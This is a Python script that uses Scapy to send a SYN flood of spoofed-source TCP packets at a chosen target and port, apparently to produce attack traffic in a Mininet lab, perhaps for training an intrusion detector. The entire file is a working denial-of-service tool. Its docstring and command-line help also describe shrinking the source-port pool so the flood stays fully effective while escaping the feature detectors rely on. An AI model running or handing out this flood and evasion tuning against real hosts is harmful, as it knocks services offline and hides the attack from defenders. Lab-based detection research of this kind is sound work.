"""SYN flood via Scapy — spoofed source IPs, half-open connections. Requires root.
Only point this at hosts inside the emulated Mininet topology.

n_source_ports controls the source-port footprint, the flood's main giveaway feature
(unique_src_ports). It is functionally free to reduce: a flood from a few source ports fills the
victim's half-open connection backlog just as well as one from thousands, so a small pool yields a
fully-functional flood with a near-benign source-port footprint (the near-boundary regime). 0 = a
fresh random port per packet (maximally obvious).
"""
import argparse
import random
import time

from scapy.all import IP, TCP, RandIP, RandShort, send


def run(target, target_port=80, rate=500, duration=10, n_source_ports=0,
        spoof_subnet="10.0.0.0/8", verbose=True):
    interval = 1.0 / rate
    port_pool = [random.randint(1024, 65535) for _ in range(n_source_ports)] if n_source_ports else None
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        sport = random.choice(port_pool) if port_pool else RandShort()
        pkt = IP(src=RandIP(spoof_subnet), dst=target) / TCP(sport=sport, dport=target_port, flags="S")
        send(pkt, verbose=0)
        sent += 1
        time.sleep(interval)
    if verbose:
        print(f"syn_flood: sent {sent} packets to {target}:{target_port} (source ports: {n_source_ports or 'random'})")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--target-port", type=int, default=80)
    parser.add_argument("--rate", type=float, default=500, help="packets per second")
    parser.add_argument("--duration", type=float, default=10, help="seconds")
    parser.add_argument("--n-source-ports", type=int, default=0,
                        help="size of the source-port pool (0 = random per packet); "
                             "small values give a stealthier, still-functional flood")
    args = parser.parse_args()
    run(args.target, args.target_port, args.rate, args.duration, args.n_source_ports)


if __name__ == "__main__":
    main()
